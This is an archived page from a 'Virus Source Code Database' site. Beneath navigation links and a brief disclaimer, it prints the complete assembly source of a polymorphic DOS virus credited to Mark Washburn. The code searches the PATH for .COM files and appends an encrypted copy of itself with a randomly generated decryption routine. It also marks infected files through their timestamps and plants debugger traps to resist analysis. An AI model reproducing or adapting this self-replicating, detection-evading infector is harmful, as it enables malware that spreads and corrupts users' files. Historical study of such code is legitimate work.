<a href="vw13_507_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13_507_asm.php">vw13_507_asm</a><br>
<a href="vw13534a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534a_asm.php">vw13534a_asm</a><br>
<a href="vw13534_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534_asm.php">vw13534_asm</a><br>
<a href="vw13534b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vw13534b_asm.php">vw13534b_asm</a><br>
<a href="vx_163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx_163_asm.php">vx_163_asm</a><br>
<a href="vx-163_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/vx-163_asm.php">vx-163_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;
;
; Copyright (C) Mark Washburn, 1990, 1991.  All Rights Reserved
;
;
; Inquires are directed to :
; Mark Washburn
; 4656 Polk Street NE
; Columbia Heights, MN 55421
; USA
;
;
;
;
CODE        SEGMENT PUBLIC 'CODE'
            ORG     100H
;
            ASSUME  CS: CODE,DS: CODE,ES: CODE
;

STOPDEBUG   EQU     1               ; define this for disassembly trap code
INT1VEC     EQU     4
INT3VEC     EQU     12
;
DTA_PTR     EQU     -4
FILE_CREA   EQU     -8
FILE_ATTR   EQU     -10
PATH_START_PTR EQU  -12
FILE_START_PTR EQU  -14
RAND_SEED   EQU     -16
PTR1        EQU     -18             ; pointer to start of loop code
PTR2        EQU     -20             ; save data_begin pointer
DAT1        EQU     -22             ; the random code used
DAT2        EQU     -24             ; the decode length plus random length offset, max_msk
                                    ; to make the decode routine more difficult to detect
DAT3        EQU     -26             ; the 'necessary crypt code' mask
;
IFNDEF      STOPDEBUG
LOCAL_STACK EQU     26
MAX_MSK     EQU     0FFH            ; this determines the maximum variance of length
ELSE
NOBUGPTR    EQU     -28
OLDINT3     EQU     -32
OLDINT1     EQU     -36
LOCAL_STACK EQU     36
MAX_MSK     EQU     0FFH            ; this determines the maximum variance of length
ENDIF
;
;
;
DOSCALL     MACRO   CALL_TYPE
            IFNB    <CALL_TYPE>
            MOV     AH, CALL_TYPE
            ENDIF
            INT     21H
            ENDM
;
SETLOC      MACRO   ARG1,REG2
            MOV     [BP + ARG1],REG2
            ENDM
;
GETLOC      MACRO   REG1,ARG2
            MOV     REG1,[BP + ARG2]
            ENDM
;
SETDAT      MACRO   ARG1,REG2
            MOV     [SI + OFFSET ARG1 - OFFSET DATA_BEGIN],REG2
            ENDM
;
GETDAT      MACRO   REG1,ARG2
            MOV     REG1,[SI + OFFSET ARG2 - OFFSET DATA_BEGIN]
            ENDM
;
REGOFS      MACRO   REG1,ARG2
            MOV     REG1,SI
            ADD     REG1,OFFSET (ARG2 - DATA_BEGIN)
            ENDM
;
NOBUG1      MACRO
IFDEF       STOPDEBUG
            INT     3
            NOP
ENDIF
            ENDM
;
NOBUG2      MACRO
IFDEF       STOPDEBUG
            INT     3
ENDIF
            ENDM
;
;
START:
            JMP     ENTRY
;
;
;
            MOV     AH,0
            INT     021H            ; program code
;                db      600h-6 dup (0)
; insert utility code here
;
ENTRY:
; space for decode routine
IFDEF       STOPDEBUG
            CALL    PRECRYPT
            DB      36 DUP (090H)   ; calculated length of offset(t41-t10)
ELSE
            DB      39 DUP (090H)   ; calculated length of offset(t41-t10)
ENDIF
;
; label the start of encoded section
ENTRY2:
            MOV     BP,SP           ; allocate locals
            SUB     SP,LOCAL_STACK
;
            PUSH    CX
MOVCMD:                             ; this label is used to locate the next instruction
            MOV     DX,OFFSET DATA_BEGIN
            SETLOC  PTR2,DX         ; save - will be modified in 'gencode'
IFDEF       STOPDEBUG
;
; save interrupt 1 and 3 vectors
;
            PUSH    DS
            MOV     AX,0
            PUSH    AX
            POP     DS
            CLI
            MOV     AX,DS: [INT1VEC]
            SETLOC  OLDINT1,AX
            MOV     AX,DS: [INT1VEC+2]
            SETLOC  OLDINT1+2,AX
            MOV     AX,DS: [INT3VEC]
            SETLOC  OLDINT3,AX
            MOV     AX,DS: [INT3VEC+2]
            SETLOC  OLDINT3+2,AX
            STI
            POP     DS
;
            CALL    BUGON
ENDIF
            MOV     SI,DX
            ADD     SI,(OFFSET OLD_CODE - OFFSET DATA_BEGIN)
            MOV     DI,0100H
            MOV     CX,03H
            CLD
            REPZ    MOVSB
            MOV     SI,DX
            DOSCALL 30H             ; check DOS version
            CMP     AL,0
            NOBUG1                  ; 0
            JNZ     CONT1           ; DOS > 2.0
            JMP     EXIT
CONT1:
            PUSH    ES
            DOSCALL 2FH             ; get program DTA
            NOBUG1                  ; 0
            SETLOC  DTA_PTR,BX
            NOBUG1                  ; 0
            SETLOC  DTA_PTR+2,ES
            POP     ES
            REGOFS  DX,MY_DTA
            DOSCALL 1AH             ; set new DTA
            PUSH    ES
            PUSH    SI
            MOV     ES,DS: [02CH]   ; environment address
            MOV     DI,0
LOOP1:
            POP     SI
            PUSH    SI
            ADD     SI,(OFFSET PATH_CHARS - OFFSET DATA_BEGIN)
            LODSB
            MOV     CX,8000H
            REPNZ   SCASB
            MOV     CX,4
LOOP2:
            LODSB
            SCASB
            JNZ     LOOP1
            LOOP    LOOP2
            POP     SI
            POP     ES
            SETLOC  PATH_START_PTR,DI
            MOV     BX,SI
            ADD     SI,OFFSET (FILE_NAME-DATA_BEGIN)
            MOV     DI,SI
            JMP     CONT6
            NOBUG2
NEXT_PATH:
            CMP     WORD PTR [BP + PATH_START_PTR],0
            JNZ     CONT3
            JMP     EXIT2
            NOBUG2
CONT3:
            PUSH    DS
            PUSH    SI
            MOV     DS,ES: [002CH]

            MOV     DI,SI
            MOV     SI,ES: [BP+PATH_START_PTR]
            ADD     DI,OFFSET (FILE_NAME-DATA_BEGIN)
LOOP3:
            LODSB
            CMP     AL,';'          ; 3bh
            JZ      CONT4
            CMP     AL,0
            JZ      CONT5
            STOSB
            JMP     LOOP3
            NOBUG2
CONT5:
            MOV     SI,0
CONT4:
            POP     BX
            POP     DS
            MOV     [BP+PATH_START_PTR],SI
            CMP     CH,0FFH
            JZ      CONT6
            MOV     AL,'\'          ; 5ch
            STOSB
CONT6:
            MOV     [BP+FILE_START_PTR],DI
            MOV     SI,BX
            ADD     SI,(OFFSET COM_SEARCH-OFFSET DATA_BEGIN)
            MOV     CX,6
            REPZ    MOVSB
            MOV     SI,BX
            MOV     AH,04EH
            REGOFS  DX,FILE_NAME
            MOV     CX,3
            DOSCALL
            JMP     CONT7
            NOBUG2
NEXT_FILE:
            DOSCALL 04FH
CONT7:
            JNB     CONT8
            JMP     NEXT_PATH
            NOBUG2
CONT8:
            MOV     AX,[SI+OFFSET(MY_DTA-DATA_BEGIN)+016H] ; low time byte
            AND     AL,01FH
            CMP     AL,01FH
            JZ      NEXT_FILE
IFNDEF      STOPDEBUG
            CMP     WORD PTR [SI+OFFSET(MY_DTA-DATA_BEGIN)+01AH],0FA00H
                                    ; file length compared; need 1.5 k spare, see rnd off
ELSE
            CMP     WORD PTR [SI+OFFSET(MY_DTA-DATA_BEGIN)+01AH],0F800H
ENDIF
            JZ      NEXT_FILE       ;    with virus length
            CMP     WORD PTR [SI+OFFSET(MY_DTA-DATA_BEGIN)+01AH],0AH
                                    ; file to short
            JZ      NEXT_FILE
            MOV     DI,[BP+FILE_START_PTR]
            PUSH    SI
            ADD     SI,OFFSET(MY_DTA-DATA_BEGIN+01EH)
MOVE_NAME:
            LODSB
            STOSB
            CMP     AL,0
            JNZ     MOVE_NAME
            POP     SI
            MOV     AX,04300H
            REGOFS  DX,FILE_NAME
            DOSCALL
            SETLOC  FILE_ATTR,CX
            MOV     AX,04301H
            AND     CX,0FFFEH
            REGOFS  DX,FILE_NAME
            DOSCALL
            MOV     AX,03D02H
            REGOFS  DX,FILE_NAME
            DOSCALL
            JNB     CONT9
            JMP     EXIT3
            NOBUG2
CONT9:
            MOV     BX,AX
            MOV     AX,05700H
            DOSCALL
            SETLOC  FILE_CREA,CX
            SETLOC  FILE_CREA+2,DX
CONT10:
            MOV     AH,3FH
            MOV     CX,3
            REGOFS  DX,OLD_CODE
            DOSCALL
            NOBUG1                  
            JB      CONT98
            NOBUG1
            CMP     AX,3
            NOBUG1
            JNZ     CONT98
            NOBUG1
            MOV     AX,04202H
            NOBUG1                  
            MOV     CX,0
            MOV     DX,0
            DOSCALL
            JNB     CONT99
CONT98:
            JMP     EXIT4
CONT99:
            NOBUG1                  
            PUSH    BX              ; save file handle
            NOBUG1
            MOV     CX,AX
            PUSH    CX
            NOBUG1
            SUB     AX,3
            NOBUG1
            SETDAT  JUMP_CODE+1,AX
            ADD     CX,(OFFSET DATA_BEGIN-OFFSET ENTRY+0100H)
            NOBUG1
            MOV     DI,SI
            NOBUG1
            SUB     DI,OFFSET DATA_BEGIN-OFFSET MOVCMD-1
            NOBUG1
            MOV     [DI],CX
;
            DOSCALL 02CH            ; seed the random number generator
            XOR     DX,CX
            NOBUG1
            SETLOC  RAND_SEED,DX
            NOBUG1                  
            CALL    RANDOM
            NOBUG1                  
            GETLOC  AX,RAND_SEED
            NOBUG1                  
            AND     AX,MAX_MSK      ; add a random offset to actual length
            NOBUG1                  
            ADD     AX,OFFSET (DATA_END-ENTRY2) ; set decode length
            NOBUG1                  
            SETLOC  DAT2,AX         ; save the decode length
            NOBUG1                  
            SETDAT  (T13+1),AX      ; set decode length in 'mov cx,xxxx'
            POP     CX              ; restore the code length of file to be infected
            NOBUG1                  
            ADD     CX,OFFSET (ENTRY2-ENTRY+0100H) ; add the length
                                    ; of uncoded area plus file offset
            SETDAT  (T11+1),CX      ;  set decode begin in 'mov di,xxxx'
            NOBUG1                  
            CALL    RANDOM
            GETLOC  AX,RAND_SEED
            NOBUG1                  
            SETLOC  DAT1,AX         ; save this random key in dat1
            SETDAT  (T12+1),AX      ; set random key in 'mov ax,xxxx'
            NOBUG1                  
            MOV     DI,SI
            NOBUG1                  
            SUB     DI,OFFSET (DATA_BEGIN-ENTRY)
            NOBUG1                  
            MOV     BX,SI
            ADD     BX,OFFSET (L11-DATA_BEGIN) ; table L11 address
            MOV     WORD PTR [BP+DAT3],000000111B ; required routines
            CALL    GEN2            ; generate first part of decrypt
            SETLOC  PTR1,DI         ; save the current counter to resolve 'loop'
            ADD     BX,OFFSET (L21-L11) ; add then next tables' offset
            NOBUG1                  
            MOV     WORD PTR [BP+DAT3],010000011B ; required plus 'nop'
            NOBUG1                  
            CALL    GEN2            ; generate second part of decrypt
            ADD     BX,OFFSET (L31-L21) ; add the next offset
            NOBUG1
            CALL    GEN2            ; generate third part of decrypt
            MOV     CX,2            ; store the loop code
            GETLOC  SI,PTR2
            NOBUG1                  
            ADD     SI,OFFSET (T40-T10) ; point to the code
            REPZ    MOVSB           ; move the code
            GETLOC  AX,PTR1         ; the loop address pointer
            SUB     AX,DI           ; the current address
            DEC     DI              ; point to the jump address
            STOSB                   ; resolve the jump
; fill in the remaining code
L991:
            GETLOC  CX,PTR2         ; get the data_begin pointer
            SUB     CX,OFFSET (DATA_BEGIN-ENTRY2) ; locate last+1 entry
            CMP     CX,DI           ; are we there yet?
            JE      L992            ; if not then fill some more space
            MOV     DX,0H           ; any code is ok
            CALL    GENCODE         ; generate the code
            JMP     L991
            NOBUG2
L992:
            GETLOC  SI,PTR2         ; restore si to point to data area ;
            PUSH    SI
            MOV     DI,SI
            NOBUG1                  
            MOV     CX,OFFSET(END1-BEGIN1) ;   move code
            ADD     SI,OFFSET(BEGIN1-DATA_BEGIN)
            NOBUG1                  
            ADD     DI,OFFSET(DATA_END-DATA_BEGIN+MAX_MSK) ; add max_msk
            MOV     DX,DI           ; set subroutine start
            REPZ    MOVSB           ; move the code
            POP     SI
            POP     BX              ; restore handle
            CALL    SETRTN          ; find this address
            ADD     AX,06H          ; <- the number necessary for proper return
            PUSH    AX
            JMP     DX              ; continue with mask & write code
; continue here after return from mask & write code
            NOBUG1                  
            JB      EXIT4
            CMP     AX,OFFSET(DATA_END-ENTRY)
            NOBUG1                  
            JNZ     EXIT4
            MOV     AX,04200H
            MOV     CX,0
            MOV     DX,0
            DOSCALL
            JB      EXIT4
            MOV     AH,040H
            MOV     CX,3
            NOBUG1                  
            REGOFS  DX,JUMP_CODE
            DOSCALL
EXIT4:
            GETLOC  DX,FILE_CREA+2
            GETLOC  CX,FILE_CREA
            AND     CX,0FFE0H
            OR      CX,0001FH
            MOV     AX,05701H
            DOSCALL
            DOSCALL 03EH            ; close file
EXIT3:
            MOV     AX,04301H
            GETLOC  CX,FILE_ATTR
            REGOFS  DX,FILE_NAME
            DOSCALL
EXIT2:
            PUSH    DS
            GETLOC  DX,DTA_PTR
            GETLOC  DS,DTA_PTR+2
            DOSCALL 01AH
            POP     DS
EXIT:
            POP     CX
            XOR     AX,AX
            XOR     BX,BX
            XOR     DX,DX
            XOR     SI,SI
            MOV     SP,BP           ; deallocate locals
            MOV     DI,0100H
            PUSH    DI
            CALL    BUGOFF
            RET
;
; common subroutines
;
;
RANDOM      PROC    NEAR
;
            GETLOC  CX,RAND_SEED    ; get the seed
            XOR     CX,813CH        ; xor random pattern
            ADD     CX,9248H        ; add random pattern
            ROR     CX,1            ; rotate
            ROR     CX,1            ; three
            ROR     CX,1            ; times.
            SETLOC  RAND_SEED,CX    ; put it back
            AND     CX,7            ; ONLY NEED LOWER 3 BITS
            PUSH    CX
            INC     CX
            XOR     AX,AX
            STC
            RCL     AX,CL
            POP     CX
            RET                     ; return
;
RANDOM      ENDP
;
SETRTN      PROC    NEAR
;
            POP     AX              ; ret near
            PUSH    AX
            RET
;
SETRTN      ENDP
;
GENCODE     PROC    NEAR
;
L999:
            CALL    RANDOM
            TEST    DX,AX           ; has this code been used yet?
            JNZ     L999            ; if this code was generated - try again
            OR      DX,AX           ; set the code as used in dx
            MOV     AX,CX           ; the look-up index
            SAL     AX,1
            PUSH    AX
            XLAT
            MOV     CX,AX           ; the count of instructions
            POP     AX
            INC     AX
            XLAT
            ADD     AX,[BP+PTR2]    ; ax = address of code to be moved
            MOV     SI,AX
            REPZ    MOVSB           ; move the code into place
            RET
;
GENCODE     ENDP
;
GEN2        PROC    NEAR
;
            MOV     DX,0H           ; used code
L990:
            CALL    GENCODE
            MOV     AX,DX           ; do we need more code
            AND     AX,[BP+DAT3]    ; the mask for the required code
            CMP     AX,[BP+DAT3]
            JNE     L990            ; if still need required code - loop again
            RET
;
GEN2        ENDP
;
IFDEF       STOPDEBUG
DOINT3:
            PUSH    BX
            MOV     BX,SP
            PUSH    AX
            PUSH    SI
            MOV     SI,WORD PTR [BX+02]
            INC     WORD PTR [BX+02] ; point to next address
            SETLOC  NOBUGPTR,SI
            LODSB                   ; get the byte following int 3
            XOR     BYTE PTR [SI],AL
            MOV     AL,[BX+7]       ; set the trap flag
            OR      AL,1
            MOV     [BX+7],AL
            POP     SI
            POP     AX
            POP     BX
            IRET
;
DOINT1:
            PUSH    BX
            MOV     BX,SP
            PUSH    AX
            PUSH    SI
            GETLOC  SI,NOBUGPTR
            LODSB
            XOR     BYTE PTR [SI],AL
            MOV     AL,[BX+7]       ; clear the trap flag
            AND     AL,0FEH
            MOV     [BX+7],AL
            POP     SI
            POP     AX
            POP     BX
BUGIRET:
            IRET
;
BUGON:
            PUSHF
            PUSH    DS
            PUSH    AX
            MOV     AX,0
            PUSH    AX
            POP     DS
            GETLOC  AX,PTR2
            SUB     AX,OFFSET(DATA_BEGIN-DOINT3)
            CLI
            MOV     DS: [INT3VEC],AX
            GETLOC  AX,PTR2
            SUB     AX,OFFSET(DATA_BEGIN-DOINT1)
            MOV     DS: [INT1VEC],AX
            PUSH    CS
            POP     AX
            MOV     DS: [INT1VEC+2],AX
            MOV     DS: [INT3VEC+2],AX
            STI
            POP     AX
            POP     DS
            POPF
            RET
;
BUGOFF:
            PUSHF
            PUSH    DS
            PUSH    AX
            MOV     AX,0
            PUSH    AX
            POP     DS

            GETLOC  AX,OLDINT3
            CLI
            MOV     DS: [INT3VEC],AX
            GETLOC  AX,OLDINT1
            MOV     DS: [INT1VEC],AX
            GETLOC  AX,OLDINT1+2
            MOV     DS: [INT1VEC+2],AX
            GETLOC  AX,OLDINT3+2
            MOV     DS: [INT3VEC+2],AX
            STI

            POP     AX
            POP     DS
            POPF
            RET
;
ENDIF
;
;
; the data area
;
DATA_BEGIN  LABEL   NEAR
;
T10         LABEL   NEAR
T11:        MOV     DI,0FFFFH
T12:        MOV     AX,0FFFFH
T13:        MOV     CX,0FFFFH
T14:        CLC
T15:        CLD
T16:        INC     SI
T17:        DEC     BX
T18:        NOP
T19         LABEL   NEAR
;
T20         LABEL   NEAR
T21:        XOR     [DI],AX
T22:        XOR     [DI],CX
T23:        XOR     DX,CX
T24:        XOR     BX,CX
T25:        SUB     BX,AX
T26:        SUB     BX,CX
T27:        SUB     BX,DX
T28:        NOP
T29         LABEL   NEAR
;
T30         LABEL   NEAR
T31:        INC     AX
T32:        INC     DI
T33:        INC     BX
T34:        INC     SI
T35:        INC     DX
T36:        CLC
T37:        DEC     BX
T38:        NOP
T39         LABEL   NEAR
;
T40:        LOOP    T20
T41         LABEL   NEAR
;
L11:        DB      OFFSET (T12-T11),OFFSET (T11-DATA_BEGIN)
L12:        DB      OFFSET (T13-T12),OFFSET (T12-DATA_BEGIN)
L13:        DB      OFFSET (T14-T13),OFFSET (T13-DATA_BEGIN)
L14:        DB      OFFSET (T15-T14),OFFSET (T14-DATA_BEGIN)
L15:        DB      OFFSET (T16-T15),OFFSET (T15-DATA_BEGIN)
L16:        DB      OFFSET (T17-T16),OFFSET (T16-DATA_BEGIN)
L17:        DB      OFFSET (T18-T17),OFFSET (T17-DATA_BEGIN)
L18:        DB      OFFSET (T19-T18),OFFSET (T18-DATA_BEGIN)
;
L21:        DB      OFFSET (T22-T21),OFFSET (T21-DATA_BEGIN)
L22:        DB      OFFSET (T23-T22),OFFSET (T22-DATA_BEGIN)
L23:        DB      OFFSET (T24-T23),OFFSET (T23-DATA_BEGIN)
L24:        DB      OFFSET (T25-T24),OFFSET (T24-DATA_BEGIN)
L25:        DB      OFFSET (T26-T25),OFFSET (T25-DATA_BEGIN)
L26:        DB      OFFSET (T27-T26),OFFSET (T26-DATA_BEGIN)
L27:        DB      OFFSET (T28-T27),OFFSET (T27-DATA_BEGIN)
L28:        DB      OFFSET (T29-T28),OFFSET (T28-DATA_BEGIN)
;
L31:        DB      OFFSET (T32-T31),OFFSET (T31-DATA_BEGIN)
L32:        DB      OFFSET (T33-T32),OFFSET (T32-DATA_BEGIN)
L33:        DB      OFFSET (T34-T33),OFFSET (T33-DATA_BEGIN)
L34:        DB      OFFSET (T35-T34),OFFSET (T34-DATA_BEGIN)
L35:        DB      OFFSET (T36-T35),OFFSET (T35-DATA_BEGIN)
L36:        DB      OFFSET (T37-T36),OFFSET (T36-DATA_BEGIN)
L37:        DB      OFFSET (T38-T37),OFFSET (T37-DATA_BEGIN)
L38:        DB      OFFSET (T39-T38),OFFSET (T38-DATA_BEGIN)
;
;
;
; this routine is relocated after the end of data area
; this routine encrypts, writes, and decrypts the virus code
;
BEGIN1:
            GETLOC  CX,DAT2         ; get off (data_end-entry2) plus max_msk
            GETLOC  AX,DAT1         ; get decode ket
            MOV     DI,SI           ; and set the begin encrypt address
            SUB     DI,OFFSET (DATA_BEGIN-ENTRY2)
            CALL    CRYPT
            MOV     AH,040H
            MOV     CX,OFFSET DATA_END-OFFSET ENTRY
            MOV     DX,SI
            SUB     DX,OFFSET DATA_BEGIN-OFFSET ENTRY
            DOSCALL
            PUSHF                   ; save the status of the write
            PUSH    AX
            GETLOC  CX,DAT2         ; get off (data_end-entry2) plus max_msk
            GETLOC  AX,DAT1
            MOV     DI,SI
            SUB     DI,OFFSET (DATA_BEGIN-ENTRY2)
            CALL    CRYPT
            POP     AX              ; restore the DOS write's status
            POPF
            RET
;
CRYPT:
            XOR     [DI],AX
            XOR     [DI],CX
            INC     AX
            INC     DI
            LOOP    CRYPT
            RET
END1:
;
; global work space and constants
;
OLD_CODE:   DB      090H,090H,090H
JUMP_CODE:  DB      0E9H,0,0
COM_SEARCH: DB      '*.COM',0
PATH_CHARS: DB      'PATH='
FILE_NAME:  DB      40H DUP (0)
MY_DTA:     DB      2BH DUP (0)
            DB      0,0,0

DATA_END    LABEL   NEAR
IFDEF       STOPDEBUG
;
SCAN_BYTES  DB      0CCH,090H
;
PRECRYPT:
            MOV     BP,SP           ; allocate locals
            SUB     SP,LOCAL_STACK
            DOSCALL 02CH            ; seed the random number generator
            XOR     DX,CX
            SETLOC  RAND_SEED,DX
            CALL    RANDOM
            MOV     DI,OFFSET START
            PUSH    DS
            POP     ES
LP999:
            MOV     CX,08000H
            MOV     SI,OFFSET SCAN_BYTES
            LODSB
            REPNZ   SCASB
            CMP     CX,0
            JE      DONE998
            CMP     DI,OFFSET DATA_END
            JGE     DONE998
            LODSB
            SCASB
            JNZ     LP999
            CALL    RANDOM
            GETLOC  AX,RAND_SEED
            DEC     DI
            MOV     [DI],AL
            INC     DI
            XOR     [DI],AL
            INC     DI              ; skip the masked byte
            JMP     SHORT LP999
DONE998:
            MOV     SP,BP
            RET
ENDIF

CODE        ENDS
            END     START

</textarea></td></tr></table></body></html>
